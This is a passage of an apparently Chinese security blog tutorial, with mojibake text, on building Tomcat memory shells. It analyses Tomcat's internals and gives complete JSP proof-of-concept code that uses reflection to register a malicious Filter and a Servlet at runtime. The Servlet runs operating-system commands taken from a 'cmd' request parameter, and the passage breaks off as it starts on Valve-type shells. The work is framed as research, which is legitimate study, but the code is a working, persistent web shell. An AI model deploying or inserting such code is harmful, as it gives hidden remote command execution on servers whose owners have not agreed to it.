class="hljs-string">&quot;CommonFilter&quot;</span>;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    standardContext.addFilterDef(filterDef);<br> <span class="hljs-comment">//åˆ›å»ºfilterMapï¼ŒfilterMapç”¨äºè·¯ç”±æ˜ å°„</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    standardContext.addFilterMapBefore(filterMap);<br> <span class="hljs-comment">//åå°„å°è£…filterConfigåŠfilterDefåˆ°filterConfigs </span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br> <br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br>    filterConfigs.put(name, filterConfig);<br>%&gt;<br></code></pre></td></tr></table></figure><p>å…ˆæ³¨å†Œæ¶æ„Filter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Filter.jsp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010440959.png" alt="image-20230201044023838"></p><h3 id="Servletå‹"><a href="#Servletå‹" class="headerlink" title="Servletå‹"></a>Servletå‹</h3><p>å…ˆåˆ›å»ºä¸€ä¸ªæ¶æ„Servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> jakarta.servlet.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.http.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.annotation.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(name = &quot;Shell_Servlet&quot;, value = &quot;/shell&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125;<span class="hljs-keyword">catch</span> (IOException | NullPointerException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010555517.png" alt="image-20230201055527413"></p><p>æ¥ç€éœ€è¦å®ç°åŠ¨æ€æ³¨å†ŒServlet</p><h4 id="Servletåˆ›å»ºæµç¨‹"><a href="#Servletåˆ›å»ºæµç¨‹" class="headerlink" title="Servletåˆ›å»ºæµç¨‹"></a>Servletåˆ›å»ºæµç¨‹</h4><p>Servletçš„ç”Ÿå‘½å‘¨æœŸåˆ†ä¸ºå¦‚ä¸‹äº”éƒ¨åˆ†</p><ol><li>åŠ è½½ï¼šå½“Tomcatç¬¬ä¸€æ¬¡è®¿é—®Servletçš„æ—¶å€™ï¼ŒTomcatä¼šè´Ÿè´£åˆ›å»ºServletçš„å®ä¾‹</li><li>åˆå§‹åŒ–ï¼šå½“Servletè¢«å®ä¾‹åŒ–åï¼ŒTomcatä¼šè°ƒç”¨<code>init()</code>æ–¹æ³•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡</li><li>å¤„ç†æœåŠ¡ï¼šå½“æµè§ˆå™¨è®¿é—®Servletçš„æ—¶å€™ï¼ŒServlet ä¼šè°ƒç”¨<code>service()</code>æ–¹æ³•å¤„ç†è¯·æ±‚</li><li>é”€æ¯ï¼šå½“Tomcatå…³é—­æ—¶æˆ–è€…æ£€æµ‹åˆ°Servletè¦ä»Tomcatåˆ é™¤çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨<code>destroy()</code>æ–¹æ³•ï¼Œè®©è¯¥å®ä¾‹é‡Šæ”¾æ‰æ‰€å çš„èµ„æºã€‚ä¸€ä¸ªServletå¦‚æœé•¿æ—¶é—´ä¸è¢«ä½¿ç”¨çš„è¯ï¼Œä¹Ÿä¼šè¢«Tomcatè‡ªåŠ¨é”€æ¯</li><li>å¸è½½ï¼šå½“Servletè°ƒç”¨å®Œ<code>destroy()</code>æ–¹æ³•åï¼Œç­‰å¾…åƒåœ¾å›æ”¶ã€‚å¦‚æœæœ‰éœ€è¦å†æ¬¡ä½¿ç”¨è¿™ä¸ªServletï¼Œä¼šé‡æ–°è°ƒç”¨<code>init()</code>æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–æ“ä½œ</li></ol><blockquote><p>Wrapperæ˜¯å¯¹Servletçš„æŠ½è±¡å’ŒåŒ…è£…ï¼Œæ¯ä¸ªContextå¯ä»¥æœ‰å¤šä¸ªWrapperï¼ŒWrapperä¸»è¦è´Ÿè´£ç®¡ç† Servlet ï¼ŒåŒ…æ‹¬çš„ Servlet çš„è£…è½½ã€åˆå§‹åŒ–ã€æ‰§è¡Œä»¥åŠèµ„æºå›æ”¶,ä¹Ÿæ˜¯æ¥ä¸‹æ¥æ³¨å†Œæ¶æ„Servletçš„å…³é”®</p></blockquote><h4 id="åˆ›å»ºStandardWrapper"><a href="#åˆ›å»ºStandardWrapper" class="headerlink" title="åˆ›å»ºStandardWrapper"></a>åˆ›å»ºStandardWrapper</h4><p>åœ¨<code>StandardContext</code>#<code>startInternal</code>ä¸­ï¼Œè°ƒç”¨äº†<code>fireLifecycleEvent()</code>æ–¹æ³•è§£æweb.xmlæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fireLifecycleEvent</span><span class="hljs-params">(String type, Object data)</span> &#123;<br>        <span class="hljs-type">LifecycleEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LifecycleEvent</span>(<span class="hljs-built_in">this</span>, type, data);<br>        <span class="hljs-keyword">for</span> (LifecycleListener listener : lifecycleListeners) &#123;<br>            listener.lifecycleEvent(event);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>æœ€ç»ˆé€šè¿‡<code>ContextConfig#webConfig()</code>æ–¹æ³•è§£æweb.xmlè·å–å„ç§é…ç½®å‚æ•°</p></blockquote><p>ç„¶åé€šè¿‡<code>configureContext(webXml)</code>æ–¹æ³•åˆ›å»ºStandWrapperå¯¹è±¡ï¼Œå¹¶æ ¹æ®è§£æå‚æ•°åˆå§‹åŒ–StandWrapperå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContext</span><span class="hljs-params">(WebXml webxml)</span> &#123;<br>        <span class="hljs-comment">// As far as possible, process in alphabetical order so it is easy to</span><br>        <span class="hljs-comment">// check everything is present</span><br>        <span class="hljs-comment">// Some validation depends on correct public ID</span><br>        context.setPublicId(webxml.getPublicId());<br> <br>...   <span class="hljs-comment">//è®¾ç½®StandardContextå‚æ•°</span><br> <br>        <br>        <span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;<br> <br>            <span class="hljs-comment">//åˆ›å»ºStandardWrapperå¯¹è±¡</span><br>            <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br> <br>            <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-literal">null</span>) &#123;<br> <br>                <span class="hljs-comment">//è®¾ç½®LoadOnStartupå±æ€§</span><br>                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (servlet.getEnabled() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setEnabled(servlet.getEnabled().booleanValue());<br>            &#125;<br> <br>            <span class="hljs-comment">//è®¾ç½®ServletNameå±æ€§</span><br>            wrapper.setName(servlet.getServletName());<br>            Map&lt;String,String&gt; params = servlet.getParameterMap();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;<br>                wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>            &#125;<br>            wrapper.setRunAs(servlet.getRunAs());<br>            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>            <span class="hljs-keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;<br>                wrapper.addSecurityReference(<br>                        roleRef.getName(), roleRef.getLink());<br>            &#125;<br> <br>            <span class="hljs-comment">//è®¾ç½®ServletClasså±æ€§</span><br>            wrapper.setServletClass(servlet.getServletClass());<br>            ...<br>            wrapper.setOverridable(servlet.isOverridable());<br> <br>            <span class="hljs-comment">//å°†åŒ…è£…å¥½çš„StandWrapperæ·»åŠ è¿›ContainerBaseçš„childrenå±æ€§ä¸­</span><br>            context.addChild(wrapper);<br> <br>           <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry :<br>                webxml.getServletMappings().entrySet()) &#123;<br>          <br>            <span class="hljs-comment">//æ·»åŠ è·¯å¾„æ˜ å°„</span><br>            context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>        &#125;<br>        &#125;<br>        ...<br>    &#125;<br></code></pre></td></tr></table></figure><p>æœ€åé€šè¿‡<code>addServletMappingDecoded()</code>æ–¹æ³•æ·»åŠ Servletå¯¹åº”çš„urlæ˜ å°„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addServletMappingDecoded</span><span class="hljs-params">(String pattern, String name,</span><br><span class="hljs-params">                                  <span class="hljs-type">boolean</span> jspWildCard)</span> &#123;<br><span class="hljs-comment">//...</span><br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) findChild(name);<br><span class="hljs-comment">//...</span><br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="åŠ è½½StandWrapper"><a href="#åŠ è½½StandWrapper" class="headerlink" title="åŠ è½½StandWrapper"></a>åŠ è½½StandWrapper</h4><p>æ¥ç€åœ¨<code>StandardContext#startInternal</code>æ–¹æ³•é€šè¿‡<code>findChildren()</code>è·å–<code>StandardWrapper</code>ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Container child : findChildren()) &#123;<br>    <span class="hljs-keyword">if</span> (!child.getState().isAvailable()) &#123;<br>        child.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åä¾æ¬¡åŠ è½½å®ŒListenerã€Filteråï¼Œå°±é€šè¿‡<code>loadOnStartUp()</code>æ–¹æ³•åŠ è½½wrapper</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loadOnStartup</span><span class="hljs-params">(Container children[])</span> &#123;<br> <br>    <span class="hljs-comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span><br>    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (Container child : children) &#123;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) child;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">loadOnStartup</span> <span class="hljs-operator">=</span> wrapper.getLoadOnStartup();<br> <br>        <span class="hljs-comment">//åˆ¤æ–­å±æ€§loadOnStartupçš„å€¼</span><br>        <span class="hljs-keyword">if</span> (loadOnStartup &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> Integer.valueOf(loadOnStartup);<br>        ArrayList&lt;Wrapper&gt; list = map.get(key);<br>        <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span>) &#123;<br>            list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>            map.put(key, list);<br>        &#125;<br>        list.add(wrapper);<br>    &#125;<br> <br>    <span class="hljs-comment">// Load the collected &quot;load on startup&quot; servlets</span><br>    <span class="hljs-keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;<br>        <span class="hljs-keyword">for</span> (Wrapper wrapper : list) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                wrapper.load();<span class="hljs-comment">//åŠ è½½Servlet</span><br>            &#125;<br></code></pre></td></tr></table></figure><blockquote><p>æœ€åçš„pocä¸­éœ€è¦æ³¨æ„<code>loadOnStartup</code>å±æ€§çš„è®¾ç½®ï¼Œåªæœ‰å¤§äº0æ‰ä¼šè¢«æ”¾å…¥listï¼Œè¿›è€Œè¢«åŠ è½½<code>wrapper.load()</code></p></blockquote><h4 id="åŠ¨æ€æ³¨å†ŒServlet"><a href="#åŠ¨æ€æ³¨å†ŒServlet" class="headerlink" title="åŠ¨æ€æ³¨å†ŒServlet"></a>åŠ¨æ€æ³¨å†ŒServlet</h4><p>é€šè¿‡ä¸Šé¢çš„åˆ†æå¯ä»¥æ€»ç»“æµç¨‹</p><ol><li>è·å–<code>StandardContext</code>å¯¹è±¡</li><li>ç¼–å†™æ¶æ„Servlet</li><li>é€šè¿‡<code>StandardContext.createWrapper()</code>åˆ›å»º<code>StandardWrapper</code>å¯¹è±¡</li><li>è®¾ç½®<code>StandardWrapper</code>å¯¹è±¡çš„<code>loadOnStartup</code>ã€<code>ServletName</code>ã€<code>ServletClass</code>å±æ€§å€¼</li><li>å°†<code>StandardWrapper</code>å¯¹è±¡æ·»åŠ è¿›<code>StandardContext</code>å¯¹è±¡çš„<code>children</code>å±æ€§ä¸­</li><li>é€šè¿‡<code>StandardContext.addServletMappingDecoded()</code>æ·»åŠ å¯¹åº”çš„è·¯å¾„æ˜ å°„</li></ol><h4 id="å®Œæ•´POCé“¾"><a href="#å®Œæ•´POCé“¾" class="headerlink" title="å®Œæ•´POCé“¾"></a>å®Œæ•´POCé“¾</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<span class="hljs-comment">//å¾—åˆ°StandardContextå¯¹è±¡</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br> <br>&lt;%!<br> <span class="hljs-comment">//æ¶æ„Servlet</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br> <br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//åˆ›å»ºStandardWrapperå¹¶è®¾ç½®å¯¹åº”å±æ€§</span><br>    <span class="hljs-type">Shell_Servlet</span> <span class="hljs-variable">shell_servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Servlet</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> shell_servlet.getClass().getSimpleName();<br> <br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<span class="hljs-comment">//ä¸èƒ½å°äº0</span><br>    wrapper.setName(name);<br>    wrapper.setServlet(shell_servlet);<br>    wrapper.setServletClass(shell_servlet.getClass().getName());<br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//ç»‘å®šè·¯ç”±</span><br>    standardContext.addChild(wrapper);<br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,name);<br>%&gt;<br></code></pre></td></tr></table></figure><p>å…ˆæ³¨å†ŒServlet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Servlet.jsp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010647020.png" alt="image-20230201064710941"></p><blockquote><p>Servletå‹å†…å­˜é©¬çš„ç¼ºç‚¹å°±æ˜¯å¿…é¡»è¦è®¿é—®å¯¹åº”çš„è·¯å¾„æ‰èƒ½å‘½ä»¤æ‰§è¡Œï¼Œæ˜“è¢«å‘ç°ã€‚</p></blockquote><h3 id="Valveå‹"><a href="#Valveå‹" class="headerlink" title="Valveå‹"></a>Valveå‹</h3><p>éœ€è¦å…ˆäº†è§£ä¸€ä¸‹tomcatä¸­çš„ç®¡é“æœºåˆ¶</p><p>Tomcat åœ¨å¤„ç†ä¸€ä¸ªè¯·æ±‚è°ƒç”¨é€»è¾‘æ—¶éœ€è¦ä¼ é€’Request å’Œ Respone å¯¹è±¡ï¼ŒTomcat ä½¿ç”¨äº†èŒè´£é“¾æ¨¡å¼æ¥å®ç°å®¢æˆ·ç«¯è¯·æ±‚çš„å¤„ç†ã€‚åœ¨ Tomcat ä¸­å®šä¹‰äº†ä¸¤ä¸ªæ¥å£ï¼šPipelineï¼ˆç®¡é“ï¼‰å’Œ Valveï¼ˆé˜€ï¼‰ã€‚è¿™ä¸¤ä¸ªæ¥å£åå­—å¾ˆå¥½çš„è¯ é‡Šäº†å¤„ç†æ¨¡å¼ï¼šæ•°æ®æµå°±åƒæ˜¯æµç»ç®¡é“çš„æ°´ä¸€æ ·ï¼Œç»è¿‡ç®¡é“ä¸Šä¸ªä¸€ä¸ªä¸ªé˜€é—¨ã€‚</p><p>Pipeline ä¸­ä¼šæœ‰ä¸€ä¸ªæœ€åŸºç¡€çš„ Valveï¼ˆbasicï¼‰ï¼Œå®ƒå§‹ç»ˆä½äºæœ«ç«¯ï¼ˆæœ€åæ‰§è¡Œï¼‰ï¼Œå°è£…äº†å…·ä½“çš„è¯·æ±‚å¤„ç†å’Œè¾“å‡ºå“åº”çš„è¿‡ç¨‹ã€‚Pipeline æä¾›äº† <code>addValve</code> æ–¹æ³•ï¼Œå¯ä»¥æ·»åŠ æ–° Valve åœ¨ basic ä¹‹å‰ï¼Œå¹¶æŒ‰ç…§æ·»åŠ é¡ºåºæ‰§è¡Œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010646623.png" alt="image-20230201064647521"></p><blockquote><p>åœ¨Tomcatä¸­ï¼Œå››å¤§ç»„ä»¶Engineã€Hostã€Contextä»¥åŠWrapperéƒ½æœ‰å…¶å¯¹åº”çš„Valveç±»ï¼ŒStandardEngineValveã€StandardHostValveã€StandardContextValveä»¥åŠStandardWrapperValveï¼Œä»–ä»¬åŒæ—¶ç»´æŠ¤ä¸€ä¸ªStandardPipelineå®ä¾‹ã€‚</p></blockquote><h4 id="åŠ¨æ€æ·»åŠ Valve"><a href="#åŠ¨æ€æ·»åŠ Valve" class="headerlink" title="åŠ¨æ€æ·»åŠ Valve"></a>åŠ¨æ€æ·»åŠ Valve</h4><p>å…ˆæ¥ç®€å•çœ‹ä¸€ä¸‹æ¥å£çš„å®šä¹‰ï¼Œ<code>org.apache.catalina.Pipeline</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td 